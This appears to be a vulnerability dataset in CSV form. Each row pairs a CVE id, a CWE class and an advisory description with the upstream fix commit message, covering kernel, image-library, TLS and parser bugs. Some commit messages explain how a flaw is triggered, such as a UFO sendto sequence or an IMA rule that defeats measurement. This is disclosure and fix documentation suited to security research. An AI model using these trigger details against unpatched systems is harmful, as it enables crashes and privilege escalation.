CVE-2011-1477,CWE-119,2012-06-21,Multiple array index errors in sound/oss/opl3.c in the Linux kernel before 2.6.39 allow local users to cause a denial of service (heap memory corruption) or possibly gain privileges by leveraging write access to /dev/sequencer.,"User-controllable indexes for voice and channel values may cause reading and writing beyond the bounds of their respective arrays, leading to potentially exploitable memory corruption.  Validate these indexes.  Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: stable@kernel.org Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2016-10218,CWE-476,2017-04-03,"The pdf14_pop_transparency_group function in base/gdevp14.c in the PDF Transparency module in Artifex Software, Inc. Ghostscript 9.20 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted file.",
CVE-2017-9732,CWE-400,2018-12-20,"The read_packet function in knc (Kerberised NetCat) before 1.11-1 is vulnerable to denial of service (memory exhaustion) that can be exploited remotely without authentication, possibly affecting another services running on the targeted host.",One of these can be remotely triggered during the authentication phase which leads to a remote DoS possibility.  Pointed out by: Imre Rad <radimre83@gmail.com>
CVE-2011-5327,CWE-119,2019-07-27,"In the Linux kernel before 3.1, an off by one in the drivers/target/loopback/tcm_loop.c tcm_loop_make_naa_tpg() function could result in at least memory corruption.",This is an off by one 'tgpt' check in tcm_loop_make_naa_tpg() that could result in memory corruption.  Signed-off-by: Dan Carpenter <error27@gmail.com> Signed-off-by: Nicholas A. Bellinger <nab@linux-iscsi.org>
CVE-2018-16300,CWE-674,2019-10-03,The BGP parser in tcpdump before 4.9.3 allows stack consumption in print-bgp.c:bgp_attr_print() because of unlimited recursion.,Enforce a limit on how many times bgp_attr_print() can recurse.  This fixes a stack exhaustion discovered by Include Security working under the Mozilla SOS program in 2018 by means of code audit.
CVE-2016-9601,CWE-119,2018-04-24,"ghostscript before version 9.21 is vulnerable to a heap based buffer overflow that was found in the ghostscript jbig2_decode_gray_scale_image function which is used to decode halftone segments in a JBIG2 image. A document (PostScript or PDF) with an embedded, specially crafted, jbig2 image could trigger a segmentation fault in ghostscript.",
CVE-2018-10199,CWE-416,2018-04-18,"In versions of mruby up to and including 1.4.0, a use-after-free vulnerability exists in src/io.c::File#initilialize_copy(). An attacker that can cause Ruby code to be run can possibly use this to execute arbitrary code.",The bug and the fix were reported by https://hackerone.com/pnoltof
CVE-2015-8896,,2017-03-15,Integer truncation issue in coders/pict.c in ImageMagick before 7.0.5-0 allows remote attackers to cause a denial of service (application crash) via a crafted .pict file.,
CVE-2017-12999,CWE-125,2017-09-14,The IS-IS parser in tcpdump before 4.9.2 has a buffer over-read in print-isoclns.c:isis_print().,This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add tests using the capture files supplied by the reporter(s).
CVE-2018-19840,CWE-835,2018-12-04,The function WavpackPackInit in pack_utils.c in libwavpack.a in WavPack through 5.1.0 allows attackers to cause a denial-of-service (resource exhaustion caused by an infinite loop) via a crafted wav audio file because WavpackSetConfiguration64 mishandles a sample rate of zero.,
CVE-2011-0530,CWE-119,2011-02-22,Buffer overflow in the mainloop function in nbd-server.c in the server in Network Block Device (nbd) before 2.9.20 might allow remote attackers to execute arbitrary code via a long request.  NOTE: this issue exists because of a CVE-2005-3534 regression.,"Yes, this means we've re-introduced CVE-2005-3534. Sigh."
CVE-2011-0006,CWE-264,2012-06-21,"The ima_lsm_rule_init function in security/integrity/ima/ima_policy.c in the Linux kernel before 2.6.37, when the Linux Security Modules (LSM) framework is disabled, allows local users to bypass Integrity Measurement Architecture (IMA) rules in opportunistic circumstances by leveraging an administrator's addition of an IMA rule for LSM.","If security_filter_rule_init() doesn't return a rule, then not everything is as fine as the return code implies.  This bug only occurs when the LSM (eg. SELinux) is disabled at runtime.  Adding an empty LSM rule causes ima_match_rules() to always succeed, ignoring any remaining rules.   default IMA TCB policy:   # PROC_SUPER_MAGIC   dont_measure fsmagic=0x9fa0   # SYSFS_MAGIC   dont_measure fsmagic=0x62656572   # DEBUGFS_MAGIC   dont_measure fsmagic=0x64626720   # TMPFS_MAGIC   dont_measure fsmagic=0x01021994   # SECURITYFS_MAGIC   dont_measure fsmagic=0x73636673    < LSM specific rule >   dont_measure obj_type=var_log_t    measure func=BPRM_CHECK   measure func=FILE_MMAP mask=MAY_EXEC   measure func=FILE_CHECK mask=MAY_READ uid=0  Thus without the patch, with the boot parameters 'tcb selinux=0', adding the above 'dont_measure obj_type=var_log_t' rule to the default IMA TCB measurement policy, would result in nothing being measured.  The patch prevents the default TCB policy from being replaced.  Signed-off-by: Mimi Zohar <zohar@us.ibm.com> Cc: James Morris <jmorris@namei.org> Acked-by: Serge Hallyn <serge.hallyn@canonical.com> Cc: David Safford <safford@watson.ibm.com> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-2108,CWE-119,2016-05-05,"The ASN.1 implementation in OpenSSL before 1.0.1o and 1.0.2 before 1.0.2c allows remote attackers to execute arbitrary code or cause a denial of service (buffer underflow and memory corruption) via an ANY field in crafted serialized data, aka the ""negative zero"" issue.",
CVE-2013-4587,CWE-20,2013-12-14,Array index error in the kvm_vm_ioctl_create_vcpu function in virt/kvm/kvm_main.c in the KVM subsystem in the Linux kernel through 3.12.5 allows local users to gain privileges via a large id value.,"In multiple functions the vcpu_id is used as an offset into a bitfield.  Ag malicious user could specify a vcpu_id greater than 255 in order to set or clear bits in kernel memory.  This could be used to elevate priveges in the kernel.  This patch verifies that the vcpu_id provided is less than 255. The api documentation already specifies that the vcpu_id must be less than max_vcpus, but this is currently not checked.  Reported-by: Andrew Honig <ahonig@google.com> Cc: stable@vger.kernel.org Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2016-2107,CWE-200,2016-05-05,"The AES-NI implementation in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h does not consider memory allocation during a certain padding check, which allows remote attackers to obtain sensitive cleartext information via a padding-oracle attack against an AES CBC session. NOTE: this vulnerability exists because of an incorrect fix for CVE-2013-0169.",
CVE-2013-1860,CWE-119,2013-03-22,Heap-based buffer overflow in the wdm_in_callback function in drivers/usb/class/cdc-wdm.c in the Linux kernel before 3.8.4 allows physically proximate attackers to cause a denial of service (system crash) or possibly execute arbitrary code via a crafted cdc-wdm USB device.,"The buffer for responses must not overflow. If this would happen, set a flag, drop the data and return an error after user space has read all remaining data.  Signed-off-by: Oliver Neukum <oliver@neukum.org> CC: stable@kernel.org Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2012-2669,CWE-20,2012-12-27,"The main function in tools/hv/hv_kvp_daemon.c in hypervkvpd, as distributed in the Linux kernel before 3.4.5, does not validate the origin of Netlink messages, which allows local users to spoof Netlink communication via a crafted connector message.",The SuSE security team suggested to use recvfrom instead of recv to be certain that the connector message is originated from kernel.  CVE-2012-2669  Signed-off-by: Olaf Hering <olaf@aepfle.de> Signed-off-by: Marcus Meissner <meissner@suse.de> Signed-off-by: Sebastian Krahmer <krahmer@suse.de> Signed-off-by: K. Y. Srinivasan <kys@microsoft.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
CVE-2014-9421,,2015-02-19,"The auth_gssapi_unwrap_data function in lib/rpc/auth_gssapi_misc.c in MIT Kerberos 5 (aka krb5) through 1.11.5, 1.12.x through 1.12.2, and 1.13.x before 1.13.1 does not properly handle partial XDR deserialization, which allows remote authenticated users to cause a denial of service (use-after-free and double free, and daemon crash) or possibly execute arbitrary code via malformed XDR data, as demonstrated by data sent to kadmind.","[MITKRB5-SA-2015-001] In auth_gssapi_unwrap_data(), do not free partial deserialization results upon failure to deserialize.  This responsibility belongs to the callers, svctcp_getargs() and svcudp_getargs(); doing it in the unwrap function results in freeing the results twice.  In xdr_krb5_tl_data() and xdr_krb5_principal(), null out the pointers we are freeing, as other XDR functions such as xdr_bytes() and xdr_string().  ticket: 8056 (new) target_version: 1.13.1 tags: pullup"
CVE-2014-0791,CWE-189,2014-01-03,Integer overflow in the license_read_scope_list function in libfreerdp/core/license.c in FreeRDP through 1.0.2 allows remote RDP servers to cause a denial of service (application crash) or possibly have unspecified other impact via a large ScopeCount value in a Scope List in a Server License Request packet.,
CVE-2018-18021,CWE-20,2018-10-07,"arch/arm64/kvm/guest.c in KVM in the Linux kernel before 4.18.12 on the arm64 platform mishandles the KVM_SET_ON_REG ioctl. This is exploitable by attackers who can create virtual machines. An attacker can arbitrarily redirect the hypervisor flow of control (with full register control). An attacker can also cause a denial of service (hypervisor panic) via an illegal exception return. This occurs because of insufficient restrictions on userspace access to the core register file, and because PSTATE.M validation does not prevent unintended execution modes.","We currently allow userspace to access the core register file in about any possible way, including straddling multiple registers and doing unaligned accesses.  This is not the expected use of the ABI, and nobody is actually using it that way. Let's tighten it by explicitly checking the size and alignment for each field of the register file.  Cc: <stable@vger.kernel.org> Fixes: 2f4a07c (""arm64: KVM: guest one-reg interface"") Reviewed-by: Christoffer Dall <christoffer.dall@arm.com> Reviewed-by: Mark Rutland <mark.rutland@arm.com> Signed-off-by: Dave Martin <Dave.Martin@arm.com> [maz: rewrote Dave's initial patch to be more easily backported] Signed-off-by: Marc Zyngier <marc.zyngier@arm.com> Signed-off-by: Will Deacon <will.deacon@arm.com>"
CVE-2016-5735,CWE-190,2017-05-23,"Integer overflow in the rwpng_read_image24_libpng function in rwpng.c in pngquant 2.7.0 allows remote attackers to have unspecified impact via a crafted PNG file, which triggers a buffer overflow.",Reported by Choi Jaeseung  Found with Sparrow (http://ropas.snu.ac.kr/sparrow)
CVE-2008-1950,CWE-189,2008-05-21,"Integer signedness error in the _gnutls_ciphertext2compressed function in lib/gnutls_cipher.c in libgnutls in GnuTLS before 2.2.4 allows remote attackers to cause a denial of service (buffer over-read and crash) via a certain integer value in the Random field in an encrypted Client Hello message within a TLS record with an invalid Record Length, which leads to an invalid cipher padding length, aka GNUTLS-SA-2008-1-3.",
CVE-2017-18079,CWE-476,2018-01-29,drivers/input/serio/i8042.c in the Linux kernel before 4.12.4 allows attackers to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact because the port->exists value can change after it is validated.,"The driver checks port->exists twice in i8042_interrupt(), first when trying to assign temporary ""serio"" variable, and second time when deciding whether it should call serio_interrupt(). The value of port->exists may change between the 2 checks, and we may end up calling serio_interrupt() with a NULL pointer:  BUG: unable to handle kernel NULL pointer dereference at 0000000000000050 IP: [<ffffffff8150feaf>] _spin_lock_irqsave+0x1f/0x40 PGD 0 Oops: 0002 [#1] SMP last sysfs file: CPU 0 Modules linked in:  Pid: 1, comm: swapper Not tainted 2.6.32-358.el6.x86_64 #1 QEMU Standard PC (i440FX + PIIX, 1996) RIP: 0010:[<ffffffff8150feaf>]  [<ffffffff8150feaf>] _spin_lock_irqsave+0x1f/0x40 RSP: 0018:ffff880028203cc0  EFLAGS: 00010082 RAX: 0000000000010000 RBX: 0000000000000000 RCX: 0000000000000000 RDX: 0000000000000282 RSI: 0000000000000098 RDI: 0000000000000050 RBP: ffff880028203cc0 R08: ffff88013e79c000 R09: ffff880028203ee0 R10: 0000000000000298 R11: 0000000000000282 R12: 0000000000000050 R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000098 FS:  0000000000000000(0000) GS:ffff880028200000(0000) knlGS:0000000000000000 CS:  0010 DS: 0018 ES: 0018 CR0: 000000008005003b CR2: 0000000000000050 CR3: 0000000001a85000 CR4: 00000000001407f0 DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 Process swapper (pid: 1, threadinfo ffff88013e79c000, task ffff88013e79b500) Stack: ffff880028203d00 ffffffff813de186 ffffffffffffff02 0000000000000000 <d> 0000000000000000 0000000000000000 0000000000000000 0000000000000098 <d> ffff880028203d70 ffffffff813e0162 ffff880028203d20 ffffffff8103b8ac Call Trace: <IRQ>  [<ffffffff813de186>] serio_interrupt+0x36/0xa0 [<ffffffff813e0162>] i8042_interrupt+0x132/0x3a0 [<ffffffff8103b8ac>] ? kvm_clock_read+0x1c/0x20 [<ffffffff8103b8b9>] ? kvm_clock_get_cycles+0x9/0x10 [<ffffffff810e1640>] handle_IRQ_event+0x60/0x170 [<ffffffff8103b154>] ? kvm_guest_apic_eoi_write+0x44/0x50 [<ffffffff810e3d8e>] handle_edge_irq+0xde/0x180 [<ffffffff8100de89>] handle_irq+0x49/0xa0 [<ffffffff81516c8c>] do_IRQ+0x6c/0xf0 [<ffffffff8100b9d3>] ret_from_intr+0x0/0x11 [<ffffffff81076f63>] ? __do_softirq+0x73/0x1e0 [<ffffffff8109b75b>] ? hrtimer_interrupt+0x14b/0x260 [<ffffffff8100c1cc>] ? call_softirq+0x1c/0x30 [<ffffffff8100de05>] ? do_softirq+0x65/0xa0 [<ffffffff81076d95>] ? irq_exit+0x85/0x90 [<ffffffff81516d80>] ? smp_apic_timer_interrupt+0x70/0x9b [<ffffffff8100bb93>] ? apic_timer_interrupt+0x13/0x20  To avoid the issue let's change the second check to test whether serio is NULL or not.  Also, let's take i8042_lock in i8042_start() and i8042_stop() instead of trying to be overly smart and using memory barriers.  Signed-off-by: Chen Hong <chenhong3@huawei.com> [dtor: take lock in i8042_start()/i8042_stop()] Cc: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>"
CVE-2013-2850,CWE-119,2013-06-07,Heap-based buffer overflow in the iscsi_add_notunderstood_response function in drivers/target/iscsi/iscsi_target_parameters.c in the iSCSI target subsystem in the Linux kernel through 3.9.4 allows remote attackers to cause a denial of service (memory corruption and OOPS) or possibly execute arbitrary code via a long key that is not properly handled during construction of an error-response packet.,"If a key was larger than 64 bytes, as checked by iscsi_check_key(), the error response packet, generated by iscsi_add_notunderstood_response(), would still attempt to copy the entire key into the packet, overflowing the structure on the heap.  Remote preauthentication kernel memory corruption was possible if a target was configured and listening on the network.  CVE-2013-2850  Signed-off-by: Kees Cook <keescook@chromium.org> Cc: stable@vger.kernel.org Signed-off-by: Nicholas Bellinger <nab@linux-iscsi.org>"
CVE-2016-9919,CWE-20,2016-12-08,"The icmp6_send function in net/ipv6/icmp.c in the Linux kernel through 4.8.12 omits a certain check of the dst data structure, which allows remote attackers to cause a denial of service (panic) via a fragmented IPv6 packet.",
CVE-2010-1155,CWE-20,2010-04-16,"Irssi before 0.8.15, when SSL is used, does not verify that the server hostname matches a domain name in the subject's Common Name (CN) field or a Subject Alternative Name field of the X.509 certificate, which allows man-in-the-middle attackers to spoof IRC servers via an arbitrary certificate.",git-svn-id: http://svn.irssi.org/repos/irssi/trunk@5104 dbcabf3a-b0e7-0310-adc4-f8d773084564
CVE-2017-13028,CWE-125,2017-09-14,The BOOTP parser in tcpdump before 4.9.2 has a buffer over-read in print-bootp.c:bootp_print().,"A capture file supplied by Bhargava Shastry, modified so the capture file won't be rejected as an invalid capture."
CVE-2013-6378,CWE-189,2013-11-27,The lbs_debugfs_write function in drivers/net/wireless/libertas/debugfs.c in the Linux kernel through 3.12.1 allows local users to cause a denial of service (OOPS) by leveraging root privileges for a zero-length write operation.,If we do a zero size allocation then it will oops.  Also we can't be sure the user passes us a NUL terminated string so I've added a terminator.  This code can only be triggered by root.  Reported-by: Nico Golde <nico@ngolde.de> Reported-by: Fabian Yamaguchi <fabs@goesec.de> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Acked-by: Dan Williams <dcbw@redhat.com> Signed-off-by: John W. Linville <linville@tuxdriver.com>
CVE-2012-2136,CWE-20,2012-08-09,"The sock_alloc_send_pskb function in net/core/sock.c in the Linux kernel before 3.4.5 does not properly validate a certain length value, which allows local users to cause a denial of service (heap-based buffer overflow and system crash) or possibly gain privileges by leveraging access to a TUN/TAP device.","We need to validate the number of pages consumed by data_len, otherwise frags array could be overflowed by userspace. So this patch validate data_len and return -EMSGSIZE when data_len may occupies more frags than MAX_SKB_FRAGS.  Signed-off-by: Jason Wang <jasowang@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-5815,CWE-787,2019-12-11,Type confusion in xsltNumberFormatGetMultipleLevel prior to libxslt 1.1.33 could allow attackers to potentially exploit heap corruption via crafted XML data.,
CVE-2017-5576,CWE-190,2017-02-06,Integer overflow in the vc4_get_bcl function in drivers/gpu/drm/vc4/vc4_gem.c in the VideoCore DRM driver in the Linux kernel before 4.9.7 allows local users to cause a denial of service or possibly have unspecified other impact via a crafted size value in a VC4_SUBMIT_CL ioctl call.,"We copy the unvalidated ioctl arguments from the user into kernel temporary memory to run the validation from, to avoid a race where the user updates the unvalidate contents in between validating them and copying them into the validated BO.  However, in setting up the layout of the kernel side, we failed to check one of the additions (the roundup() for shader_rec_offset) against integer overflow, allowing a nearly MAX_UINT value of bin_cl_size to cause us to under-allocate the temporary space that we then copy_from_user into.  Reported-by: Murray McAllister <murray.mcallister@insomniasec.com> Signed-off-by: Eric Anholt <eric@anholt.net> Fixes: d5b1a78 (""drm/vc4: Add support for drawing 3D frames."")"
CVE-2017-2616,CWE-267,2018-07-27,A race condition was found in util-linux before 2.32.1 in the way su handled the management of child processes. A local authenticated attacker could use this flaw to kill other processes with root privileges under specific conditions.,Reported-by: Tobias Stöckmann <tobias@stoeckmann.org> Signed-off-by: Karel Zak <kzak@redhat.com>
CVE-2019-15139,CWE-125,2019-08-18,"The XWD image (X Window System window dumping file) parsing component in ImageMagick 7.0.8-41 Q16 allows attackers to cause a denial-of-service (application crash resulting from an out-of-bounds Read) in ReadXWDImage in coders/xwd.c by crafting a corrupted XWD image file, a different vulnerability than CVE-2019-11472.",
CVE-2015-8952,CWE-19,2016-10-16,"The mbcache feature in the ext2 and ext4 filesystem implementations in the Linux kernel before 4.6 mishandles xattr block caching, which allows local users to cause a denial of service (soft lockup) via filesystem operations in environments that use many attributes, as demonstrated by Ceph and Samba.","Original mbcache was designed to have more features than what ext? filesystems ended up using. It supported entry being in more hashes, it had a home-grown rwlocking of each entry, and one cache could cache entries from multiple filesystems. This genericity also resulted in more complex locking, larger cache entries, and generally more code complexity.  This is reimplementation of the mbcache functionality to exactly fit the purpose ext? filesystems use it for. Cache entries are now considerably smaller (7 instead of 13 longs), the code is considerably smaller as well (414 vs 913 lines of code), and IMO also simpler. The new code is also much more lightweight.  I have measured the speed using artificial xattr-bench benchmark, which spawns P processes, each process sets xattr for F different files, and the value of xattr is randomly chosen from a pool of V values. Averages of runtimes for 5 runs for various combinations of parameters are below. The first value in each cell is old mbache, the second value is the new mbcache.  V=10 F\P	1		2		4		8		16		32		64 10	0.158,0.157	0.208,0.196	0.500,0.277	0.798,0.400	3.258,0.584	13.807,1.047	61.339,2.803 100	0.172,0.167	0.279,0.222	0.520,0.275	0.825,0.341	2.981,0.505	12.022,1.202	44.641,2.943 1000	0.185,0.174	0.297,0.239	0.445,0.283	0.767,0.340	2.329,0.480	6.342,1.198	16.440,3.888  V=100 F\P	1		2		4		8		16		32		64 10	0.162,0.153	0.200,0.186	0.362,0.257	0.671,0.496	1.433,0.943	3.801,1.345	7.938,2.501 100	0.153,0.160	0.221,0.199	0.404,0.264	0.945,0.379	1.556,0.485	3.761,1.156	7.901,2.484 1000	0.215,0.191	0.303,0.246	0.471,0.288	0.960,0.347	1.647,0.479	3.916,1.176	8.058,3.160  V=1000 F\P	1		2		4		8		16		32		64 10	0.151,0.129	0.210,0.163	0.326,0.245	0.685,0.521	1.284,0.859	3.087,2.251	6.451,4.801 100	0.154,0.153	0.211,0.191	0.276,0.282	0.687,0.506	1.202,0.877	3.259,1.954	8.738,2.887 1000	0.145,0.179	0.202,0.222	0.449,0.319	0.899,0.333	1.577,0.524	4.221,1.240	9.782,3.579  V=10000 F\P	1		2		4		8		16		32		64 10	0.161,0.154	0.198,0.190	0.296,0.256	0.662,0.480	1.192,0.818	2.989,2.200	6.362,4.746 100	0.176,0.174	0.236,0.203	0.326,0.255	0.696,0.511	1.183,0.855	4.205,3.444	19.510,17.760 1000	0.199,0.183	0.240,0.227	1.159,1.014	2.286,2.154	6.023,6.039	---,10.933	---,36.620  V=100000 F\P	1		2		4		8		16		32		64 10	0.171,0.162	0.204,0.198	0.285,0.230	0.692,0.500	1.225,0.881	2.990,2.243	6.379,4.771 100	0.151,0.171	0.220,0.210	0.295,0.255	0.720,0.518	1.226,0.844	3.423,2.831	19.234,17.544 1000	0.192,0.189	0.249,0.225	1.162,1.043	2.257,2.093	5.853,4.997	---,10.399	---,32.198  We see that the new code is faster in pretty much all the cases and starting from 4 processes there are significant gains with the new code resulting in upto 20-times shorter runtimes. Also for large numbers of cached entries all values for the old code could not be measured as the kernel started hitting softlockups and died before the test completed.  Signed-off-by: Jan Kara <jack@suse.cz> Signed-off-by: Theodore Ts'o <tytso@mit.edu>"
CVE-2016-4796,CWE-119,2017-02-03,Heap-based buffer overflow in the color_cmyk_to_rgb in common/color.c in OpenJPEG before 2.1.1 allows remote attackers to cause a denial of service (crash) via a crafted .j2k file.,Fix #774
CVE-2012-6549,CWE-200,2013-03-15,"The isofs_export_encode_fh function in fs/isofs/export.c in the Linux kernel before 3.6 does not initialize a certain structure member, which allows local users to obtain sensitive information from kernel heap memory via a crafted application.",For type 1 the parent_offset member in struct isofs_fid gets copied uninitialized to userland. Fix this by initializing it to 0.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: Jan Kara <jack@suse.cz>
CVE-2016-5104,CWE-284,2016-06-13,The socket_create function in common/socket.c in libimobiledevice and libusbmuxd allows remote attackers to bypass intended access restrictions and communicate with services on iOS devices by connecting to an IPv4 TCP socket.,
CVE-2013-4300,CWE-264,2013-09-25,"The scm_check_creds function in net/core/scm.c in the Linux kernel before 3.11 performs a capability check in an incorrect namespace, which allows local users to gain privileges via PID spoofing.","This is a security bug.  The follow-up will fix nsproxy to discourage this type of issue from happening again.  Cc: stable@vger.kernel.org Signed-off-by: Andy Lutomirski <luto@amacapital.net> Reviewed-by: ""Eric W. Biederman"" <ebiederm@xmission.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-20839,,2019-05-17,"systemd 242 changes the VT1 mode upon a logout, which allows attackers to read cleartext passwords in certain circumstances, such as watching a shutdown, or using Ctrl-Alt-F1 and Ctrl-Alt-F2. This occurs because the KDGKBMODE (aka current keyboard mode) check is mishandled.",VT kbd reset check
CVE-2017-15032,CWE-772,2017-10-05,ImageMagick version 7.0.7-2 contains a memory leak in ReadYCBCRImage in coders/ycbcr.c.,
CVE-2018-5730,CWE-90,2018-03-06,"MIT krb5 1.6 or later allows an authenticated kadmin with permission to add principals to an LDAP Kerberos database to circumvent a DN containership check by supplying both a ""linkdn"" and ""containerdn"" database argument, or by supplying a DN string which is a left extension of a container DN string but is not hierarchically within the container DN.","KDB_TL_USER_INFO tl-data is intended to be internal to the LDAP KDB module, and not used in disk or wire principal entries.  Prevent kadmin clients from sending KDB_TL_USER_INFO tl-data by giving it a type number less than 256 and filtering out type numbers less than 256 in kadm5_create_principal_3().  (We already filter out low type numbers in kadm5_modify_principal()).  In the LDAP KDB module, if containerdn and linkdn are both specified in a put_principal operation, check both linkdn and the computed standalone_principal_dn for container membership.  To that end, factor out the checks into helper functions and call them on all applicable client-influenced DNs.  CVE-2018-5729:  In MIT krb5 1.6 or later, an authenticated kadmin user with permission to add principals to an LDAP Kerberos database can cause a null dereference in kadmind, or circumvent a DN container check, by supplying tagged data intended to be internal to the database module. Thanks to Sharwan Ram and Pooja Anil for discovering the potential null dereference.  CVE-2018-5730:  In MIT krb5 1.6 or later, an authenticated kadmin user with permission to add principals to an LDAP Kerberos database can circumvent a DN containership check by supplying both a ""linkdn"" and ""containerdn"" database argument, or by supplying a DN string which is a left extension of a container DN string but is not hierarchically within the container DN.  ticket: 8643 (new) tags: pullup target_version: 1.16-next target_version: 1.15-next"
CVE-2017-14032,CWE-287,2017-08-30,"ARM mbed TLS before 1.3.21 and 2.x before 2.1.9, if optional authentication is configured, allows remote attackers to bypass peer authentication via an X.509 certificate chain with many intermediates. NOTE: although mbed TLS was formerly known as PolarSSL, the releases shipped with the PolarSSL name are not affected.",Everything else is a fatal error. Also improve documentation about that for the vrfy callback.
CVE-2018-15853,CWE-400,2018-08-25,"Endless recursion exists in xkbcomp/expr.c in xkbcommon and libxkbcommon before 0.8.1, which could be used by local attackers to crash xkbcommon users by supplying a crafted keymap file that triggers boolean negation.","The expression evaluator would go into an infinite recursion when evaluating something like this as a boolean: `!True`. Instead of recursing to just `True` and negating, it recursed to `!True` itself again.  Bug inherited from xkbcomp.  Caught with the afl fuzzer.  Signed-off-by: Ran Benita <ran234@gmail.com>"
CVE-2013-1944,CWE-200,2013-04-29,"The tailMatch function in cookie.c in cURL and libcurl before 7.30.0 does not properly match the path domain when sending cookies, which allows remote attackers to steal cookies via a matching suffix in the domain of a URL.","Cookies set for 'example.com' could accidentaly also be sent by libcurl to the 'bexample.com' (ie with a prefix to the first domain name).  This is a security vulnerabilty, CVE-2013-1944.  Bug: http://curl.haxx.se/docs/adv_20130412.html"
CVE-2017-5549,CWE-532,2017-02-06,"The klsi_105_get_line_state function in drivers/usb/serial/kl5kusb105.c in the Linux kernel before 4.9.5 places uninitialized heap-memory contents into a log entry upon a failure to read the line status, which allows local users to obtain sensitive information by reading the log.","The current implementation failed to detect short transfers when attempting to read the line state, and also, to make things worse, logged the content of the uninitialised heap transfer buffer.  Fixes: abf492e (""USB: kl5kusb105: fix DMA buffers on stack"") Fixes: 1da177e4c3f4 (""Linux-2.6.12-rc2"") Cc: stable <stable@vger.kernel.org> Reviewed-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org> Signed-off-by: Johan Hovold <johan@kernel.org>"
CVE-2018-10184,CWE-119,2018-05-09,"An issue was discovered in HAProxy before 1.8.8. The incoming H2 frame length was checked against the max_frame_size setting instead of being checked against the bufsize. The max_frame_size only applies to outgoing traffic and not to incoming, so if a large enough frame size is advertised in the SETTINGS frame, a wrapped frame will be defragmented into a temporary allocated buffer where the second fragment may overflow the heap by up to 16 kB. It is very unlikely that this can be exploited for code execution given that buffers are very short lived and their addresses not realistically predictable in production, but the likelihood of an immediate crash is absolutely certain.",
CVE-2016-3135,CWE-189,2016-04-27,Integer overflow in the xt_alloc_table_info function in net/netfilter/x_tables.c in the Linux kernel through 4.5.2 on 32-bit platforms allows local users to gain privileges or cause a denial of service (heap memory corruption) via an IPT_SO_SET_REPLACE setsockopt call.,"Ben Hawkes says:  integer overflow in xt_alloc_table_info, which on 32-bit systems can  lead to small structure allocation and a copy_from_user based heap  corruption.  Reported-by: Ben Hawkes <hawkes@google.com> Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2011-4112,,2012-05-17,"The net subsystem in the Linux kernel before 3.1 does not properly restrict use of the IFF_TX_SKB_SHARING flag, which allows local users to cause a denial of service (panic) by leveraging the CAP_NET_ADMIN capability to access /proc/net/pktgen/pgctrl, and then using the pktgen package in conjunction with a bridge device for a VLAN interface.","After the last patch, We are left in a state in which only drivers calling ether_setup have IFF_TX_SKB_SHARING set (we assume that drivers touching real hardware call ether_setup for their net_devices and don't hold any state in their skbs.  There are a handful of drivers that violate this assumption of course, and need to be fixed up.  This patch identifies those drivers, and marks them as not being able to support the safe transmission of skbs by clearning the IFF_TX_SKB_SHARING flag in priv_flags  Signed-off-by: Neil Horman <nhorman@tuxdriver.com> CC: Karsten Keil <isdn@linux-pingi.de> CC: ""David S. Miller"" <davem@davemloft.net> CC: Jay Vosburgh <fubar@us.ibm.com> CC: Andy Gospodarek <andy@greyhouse.net> CC: Patrick McHardy <kaber@trash.net> CC: Krzysztof Halasa <khc@pm.waw.pl> CC: ""John W. Linville"" <linville@tuxdriver.com> CC: Greg Kroah-Hartman <gregkh@suse.de> CC: Marcel Holtmann <marcel@holtmann.org> CC: Johannes Berg <johannes@sipsolutions.net> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2013-4470,CWE-264,2013-11-04,"The Linux kernel before 3.12, when UDP Fragmentation Offload (UFO) is enabled, does not properly initialize certain data structures, which allows local users to cause a denial of service (memory corruption and system crash) or possibly gain privileges via a crafted application that uses the UDP_CORK option in a setsockopt system call and sends both short and long packets, related to the ip_ufo_append_data function in net/ipv4/ip_output.c and the ip6_ufo_append_data function in net/ipv6/ip6_output.c.","Now, if user application does: sendto len<mtu flag MSG_MORE sendto len>mtu flag 0 The skb is not treated as fragmented one because it is not initialized that way. So move the initialization to fix this.  introduced by: commit e89e9cf ""[IPv4/IPv6]: UFO Scatter-gather approach""  Signed-off-by: Jiri Pirko <jiri@resnulli.us> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-7586,CWE-119,2017-04-07,"In libsndfile before 1.0.28, an error in the ""header_read()"" function (common.c) when handling ID3 tags can be exploited to cause a stack-based buffer overflow via a specially crafted FLAC file.","Previously, the `psf->header` buffer was a fixed length specified by `SF_HEADER_LEN` which was set to `12292`. This was problematic for two reasons; this value was un-necessarily large for the majority of files and too small for some others.  Now the size of the header buffer starts at 256 bytes and grows as necessary up to a maximum of 100k."
CVE-2018-18585,CWE-476,2018-10-23,"chmd_read_headers in mspack/chmd.c in libmspack before 0.8alpha accepts a filename that has '\0' as its first or second character (such as the ""/\0"" name).",
